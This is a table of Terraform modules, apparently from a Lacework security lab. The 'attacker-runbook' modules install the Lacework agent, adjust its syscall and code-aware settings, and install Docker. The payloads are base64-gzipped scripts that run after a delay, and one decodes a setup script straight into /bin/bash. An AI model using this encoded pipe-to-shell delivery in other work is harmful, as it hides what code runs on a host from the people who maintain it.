| ModuleName                                               | Source                                               | Tag                                              | ConfigPath                                                        | ConfigOptionsDefault                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | PayloadPath                                                                                                      | Payload                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
|:---------------------------------------------------------|:-----------------------------------------------------|:-------------------------------------------------|:------------------------------------------------------------------|:--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|:-----------------------------------------------------------------------------------------------------------------|:-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| attacker-runbook-deploy-lacework                         | ./modules/runbook/deploy-lacework-agent              | runbook_deploy_lacework                          | context.azure.runbook.deploy_lacework_agent                       | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_lacework_agent&quot;: {<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-lacework-agent              | <pre>locals \{<br/>    tool = &quot;lacework&quot;<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;Starting\.\.\.&quot;<br/>    if \[ \-f /var/lib/lacework/config/config\.json \] &amp;&amp; pgrep datacollector &gt; /dev/null; then<br/>        log &quot;lacework already installed \- nothing to do&quot;<br/>    else<br/>        log &quot;lacework not installed \- installing\.\.\.&quot;<br/>        echo &#x27;$\{base64gzip\(local\.setup\_lacework\_agent\)\}&#x27; \| base64 \-d \| gunzip \| /bin/bash \-<br/>    fi<br/>    log &quot;done\.&quot;<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        if \[ \-f /var/lib/lacework/config/config\.json \] &amp;&amp; pgrep datacollector &gt; /dev/null; then<br/>            log &quot;$\{local\.tool\} found \- no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        if \[ \-f /var/lib/lacework/config/config\.json \] &amp;&amp; pgrep datacollector &gt; /dev/null; then<br/>            log &quot;$\{local\.tool\} found \- no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    setup\_lacework\_agent = templatefile\(&quot;$\{path\.module\}/resources/setup\_lacework\_agent\.sh&quot;, \{<br/>        LaceworkInstallPath=&quot;/var/lib/lacework&quot;<br/>        LaceworkTempPath=var\.inputs\[&quot;lacework\_agent\_temp\_path&quot;\]<br/>        Tags=jsonencode\(var\.inputs\[&quot;lacework\_agent\_tags&quot;\]\)<br/>        Hash=&quot;&quot;<br/>        Serverurl=var\.inputs\[&quot;lacework\_server\_url&quot;\]<br/>        Token=try\(length\(var\.inputs\[&quot;lacework\_agent\_access\_token&quot;\]\), &quot;false&quot;\) \!= &quot;false&quot; ? var\.inputs\[&quot;lacework\_agent\_access\_token&quot;\] : lacework\_agent\_access\_token\.agent\[0\]\.token<br/>    \}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_setup\_lacework\_agent\.sh&quot;<br/>                content = base64encode\(local\.setup\_lacework\_agent\)<br/>            \}<br/>        \]<br/>    \}<br/>\}<br/><br/>\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#<br/>\# LACEWORK AGENT<br/>\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#<br/><br/>resource &quot;random\_string&quot; &quot;this&quot; \{<br/>    length            = 4<br/>    special           = false<br/>    upper             = false<br/>    lower             = true<br/>    numeric           = true<br/>\}<br/><br/>resource &quot;lacework\_agent\_access\_token&quot; &quot;agent&quot; \{<br/>    count = try\(length\(var\.inputs\[&quot;lacework\_agent\_access\_token&quot;\]\), &quot;false&quot;\) \!= &quot;false&quot; ? 0 : 1<br/>    name = &quot;endpoint\-agent\-access\-token\-$\{random\_string\.this\.id\}\-$\{var\.inputs\[&quot;environment&quot;\]\}\-$\{var\.inputs\[&quot;deployment&quot;\]\}&quot;<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| attacker-runbook-deploy-lacework-syscall-config          | ./modules/runbook/deploy-lacework-syscall-config     | runbook_deploy_lacework_syscall                  | context.azure.runbook.deploy_lacework_syscall_config              | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_lacework_syscall_config&quot;: {<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-lacework-syscall-config     | <pre>locals \{<br/>    tool = &quot;lacework\-sycall\-config&quot;<br/>    lacework\_install\_path = &quot;/var/lib/lacework&quot;<br/>    lacework\_syscall\_config\_path = &quot;$\{local\.lacework\_install\_path\}/config/syscall\_config\.yaml&quot;<br/>    syscall\_config = file\(var\.inputs\[&quot;syscall\_config&quot;\]\)<br/>    base64\_syscall\_config = local\.syscall\_config<br/>    hash\_syscall\_config = sha256\(local\.syscall\_config\)<br/>    payload = &lt;&lt;\-EOT<br/>    LACEWORK\_INSTALL\_PATH=&quot;$\{local\.lacework\_install\_path\}&quot;<br/>    LACEWORK\_SYSCALL\_CONFIG\_PATH=$\{local\.lacework\_syscall\_config\_path\}<br/>    <br/>    \# Check if Lacework is pre\-installed\. If installed, add syscall\_config\.yaml\.<br/>    if \[ \-f &quot;$LACEWORK\_INSTALL\_PATH/datacollector&quot; \]; then<br/>        log &quot;Lacework agent is installed, adding syscall\_config\.yaml\.\.\.&quot;<br/>        if echo &quot;$\{local\.hash\_syscall\_config\}  $LACEWORK\_SYSCALL\_CONFIG\_PATH&quot; \| sha256sum \-\-check \-\-status; then <br/>            log &quot;Lacework syscall\_config\.yaml unchanged&quot;; <br/>        else <br/>            log &quot;Lacework syscall\_config\.yaml requires update&quot;<br/>            echo \-n &quot;$\{base64gzip\(local\.base64\_syscall\_config\)\}&quot; \| base64 \-d \| gunzip &gt; $LACEWORK\_SYSCALL\_CONFIG\_PATH<br/>        fi<br/>        log &quot;Lacework agent is installed, adding disable aggregation config\.\.\.&quot;<br/>        file\_path=&quot;/var/lib/lacework/config/config\.json&quot;<br/><br/>        log &quot;Checking for ebpf aggregate\_events disabled\.\.\.&quot;<br/>        grep \-q &#x27;&quot;ebpf&quot;\[\[:space:\]\]\*:\[\[:space:\]\]\*\{\[\[:space:\]\]\*&quot;aggregate\_events&quot;\[\[:space:\]\]\*:\[\[:space:\]\]\*&quot;false&quot;\[\[:space:\]\]\*\}&#x27; $file\_path<br/>        if \[ $? \-ne 0 \]; then<br/>            log &quot;ebpf aggregate\_events not currently disabled\.\.\.&quot;<br/>            grep \-q &#x27;&quot;ebpf&quot;\[\[:space:\]\]\*:\[\[:space:\]\]\*\{\[^\}\]\*\}&#x27; $file\_path<br/>            if \[ $? \-eq 0 \]; then<br/>                log &quot;Found existing ebpf config \- updating\.\.\.&quot;<br/>                sed \-i &#x27;s/&quot;ebpf&quot;\[\[:space:\]\]\*:\[\[:space:\]\]\*\{\[^\}\]\*\}/&quot;ebpf&quot;: \{&quot;aggregate\_events&quot;: &quot;false&quot;\}/&#x27; $file\_path<br/>            else<br/>                log &quot;No existing ebpf config \- appending\.\.\.&quot;<br/>                sed \-i &#x27;1s/\{/\{\\n  &quot;ebpf&quot;: \{&quot;aggregate\_events&quot;: &quot;false&quot;\},/&#x27; $file\_path<br/>            fi<br/>        else<br/>            log &quot;ebpf aggregate\_events already enabled\.&quot;<br/>        fi<br/>    fi<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        while \! \[ \-f /var/lib/lacework/config/config\.json \]; do<br/>            log &quot;lacework installation not found \- waiting&quot;; <br/>            sleep 120;<br/>        done<br/>        EOT<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        while \! \[ \-f /var/lib/lacework/config/config\.json \]; do<br/>            log &quot;lacework installation not found \- waiting&quot;; <br/>            sleep 120;<br/>        done<br/>        EOT<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| attacker-runbook-deploy-lacework-code-aware-agent        | ./modules/runbook/deploy-lacework-code-aware-agent   | runbook_deploy_lacework_code_aware_agent         | context.azure.runbook.deploy_lacework_code_aware_agent            | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_lacework_code_aware_agent&quot;: {<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-lacework-code-aware-agent   | <pre>locals \{<br/>    tool = &quot;lacework\-codeware\-agent&quot;<br/>    lacework\_install\_path = &quot;/var/lib/lacework&quot;<br/>    payload = &lt;&lt;\-EOT<br/>    LACEWORK\_INSTALL\_PATH=&quot;$\{local\.lacework\_install\_path\}&quot;  <br/>    <br/>    \# Check if Lacework is pre\-installed\. If installed, add code aware agent config\.<br/>    if \[ \-f &quot;$LACEWORK\_INSTALL\_PATH/datacollector&quot; \]; then<br/>        log &quot;Lacework agent is installed, adding code aware agent config\.\.\.&quot;<br/>        file\_path=&quot;/var/lib/lacework/config/config\.json&quot;<br/>        <br/>        log &quot;Checking for codeaware agent config enable\.\.\.&quot;<br/>        grep \-q &#x27;&quot;codeaware&quot;\[\[:space:\]\]\*:\[\[:space:\]\]\*\{\[\[:space:\]\]\*&quot;enable&quot;\[\[:space:\]\]\*:\[\[:space:\]\]\*&quot;all&quot;\[\[:space:\]\]\*\}&#x27; $file\_path<br/>        if \[ $? \-ne 0 \]; then<br/>            log &quot;Code aware agent not currently enabled\.\.\.&quot;<br/>            grep \-q &#x27;&quot;codeaware&quot;\[\[:space:\]\]\*:\[\[:space:\]\]\*\{\[^\}\]\*\}&#x27; $file\_path<br/>            if \[ $? \-eq 0 \]; then<br/>                log &quot;Found existing codeaware config \- updating\.\.\.&quot;<br/>                sed \-i &#x27;s/&quot;codeaware&quot;\[\[:space:\]\]\*:\[\[:space:\]\]\*\{\[^\}\]\*\}/&quot;codeaware&quot;: \{&quot;enable&quot;: &quot;all&quot;\}/&#x27; $file\_path<br/>            else<br/>                log &quot;No existing codeaware config \- appending\.\.\.&quot;<br/>                sed \-i &#x27;1s/\{/\{\\n  &quot;codeaware&quot;: \{&quot;enable&quot;: &quot;all&quot;\},/&#x27; $file\_path<br/>            fi<br/>        else<br/>            log &quot;Code aware agent config already enabled\.&quot;<br/>        fi<br/>    fi<br/>    log &quot;Done&quot;<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        while \! \[ \-f /var/lib/lacework/config/config\.json \]; do<br/>            log &quot;lacework installation not found \- waiting&quot;; <br/>            sleep 120;<br/>        done<br/>        EOT<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        while \! \[ \-f /var/lib/lacework/config/config\.json \]; do<br/>            log &quot;lacework installation not found \- waiting&quot;; <br/>            sleep 120;<br/>        done<br/>        EOT<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| attacker-runbook-deploy-docker                           | ./modules/runbook/deploy-docker                      | runbook_deploy_docker                            | context.azure.runbook.deploy_docker                               | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_docker&quot;: {<br/>                    &quot;docker_users&quot;: [],<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-docker                      | <pre>locals \{<br/>    tool=&quot;docker&quot;<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;Checking for $\{local\.tool\}\.\.\.&quot;<br/>    if \! command \-v $\{local\.tool\} &amp;&gt;/dev/null; then<br/>        log &quot;$\{local\.tool\} not found installation required&quot;<br/>    fi<br/>    log &quot;$\{local\.tool\} path: $\(command \-v  $\{local\.tool\}\)&quot;<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        if command \-v $\{local\.tool\} &amp;&gt;/dev/null; then<br/>            log &quot;$\{local\.tool\} found \- no installation required&quot;; <br/>            \# ensure non root users are added to the docker group<br/>            if \[\[ &quot;&quot; \!= &quot;$\{join\(&quot; &quot;, var\.inputs\[&quot;docker\_users&quot;\]\)\}&quot; \]\] &amp;&amp; grep docker /etc/group &gt; /dev/null 2&gt;&amp;1;  then<br/>                usermod \-aG docker $\{join\(&quot;\\nusermod \-aG docker &quot;, var\.inputs\[&quot;docker\_users&quot;\]\)\}<br/>            fi<br/>            exit 0; <br/>        fi<br/>        sudo apt\-get update<br/>        sudo apt\-get remove \-y docker docker\-engine docker\.io containerd runc<br/>        sudo apt\-get install \-y \\<br/>            ca\-certificates \\<br/>            curl \\<br/>            gnupg \\<br/>            lsb\-release<br/>        sudo mkdir \-p /etc/apt/keyrings<br/>        sudo rm \-f /etc/apt/keyrings/docker\.gpg<br/>        curl \-fsSL https://download\.docker\.com/linux/ubuntu/gpg \| sudo gpg \-\-dearmor \-o /etc/apt/keyrings/docker\.gpg<br/>        echo \\<br/>        &quot;deb \[arch=$\(dpkg \-\-print\-architecture\) signed\-by=/etc/apt/keyrings/docker\.gpg\] https://download\.docker\.com/linux/ubuntu \\<br/>        $\(lsb\_release \-cs\) stable&quot; \| sudo tee /etc/apt/sources\.list\.d/docker\.list &gt; /dev/null<br/>        sudo apt\-get update<br/>        EOT<br/>        apt\_packages = &quot;docker\-ce docker\-ce\-cli containerd\.io docker\-buildx\-plugin docker\-compose\-plugin&quot;<br/>        apt\_post\_tasks = &lt;&lt;\-EOT<br/>        \# ensure non root users are added to the docker group<br/>        if \[\[ &quot;&quot; \!= &quot;$\{join\(&quot; &quot;, var\.inputs\[&quot;docker\_users&quot;\]\)\}&quot; \]\] &amp;&amp; grep docker /etc/group &gt; /dev/null 2&gt;&amp;1;  then<br/>            usermod \-aG docker $\{join\(&quot;\\nusermod \-aG docker &quot;, var\.inputs\[&quot;docker\_users&quot;\]\)\}<br/>        fi<br/>        EOT<br/>        yum\_pre\_tasks = &lt;&lt;\-EOT<br/>        if command \-v $\{local\.tool\} &amp;&gt;/dev/null; then<br/>            log &quot;$\{local\.tool\} found \- no installation required&quot;;<br/>            \# ensure non root users are added to the docker group<br/>            if \[\[ &quot;&quot; \!= &quot;$\{join\(&quot; &quot;, var\.inputs\[&quot;docker\_users&quot;\]\)\}&quot; \]\] &amp;&amp; grep docker /etc/group &gt; /dev/null 2&gt;&amp;1;  then<br/>                usermod \-aG docker $\{join\(&quot;\\nusermod \-aG docker &quot;, var\.inputs\[&quot;docker\_users&quot;\]\)\}<br/>            fi<br/>            exit 0; <br/>        fi<br/>        yum update \-y<br/>        yum remove docker \\<br/>                  docker\-client \\<br/>                  docker\-client\-latest \\<br/>                  docker\-common \\<br/>                  docker\-latest \\<br/>                  docker\-latest\-logrotate \\<br/>                  docker\-logrotate \\<br/>                  docker\-engine<br/>        yum install \-y yum\-utils<br/>        yum\-config\-manager \-\-add\-repo https://download\.docker\.com/linux/centos/docker\-ce\.repo<br/>        EOT<br/>        yum\_packages = &quot;docker\-ce docker\-ce\-cli containerd\.io docker\-buildx\-plugin docker\-compose\-plugin&quot;<br/>        yum\_post\_tasks = &lt;&lt;\-EOT<br/>        \# ensure non root users are added to the docker group<br/>        if \[\[ &quot;&quot; \!= &quot;$\{join\(&quot; &quot;, var\.inputs\[&quot;docker\_users&quot;\]\)\}&quot; \]\] &amp;&amp; grep docker /etc/group &gt; /dev/null 2&gt;&amp;1;  then<br/>            usermod \-aG docker $\{join\(&quot;\\nusermod \-aG docker &quot;, var\.inputs\[&quot;docker\_users&quot;\]\)\}<br/>        fi<br/>        EOT<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
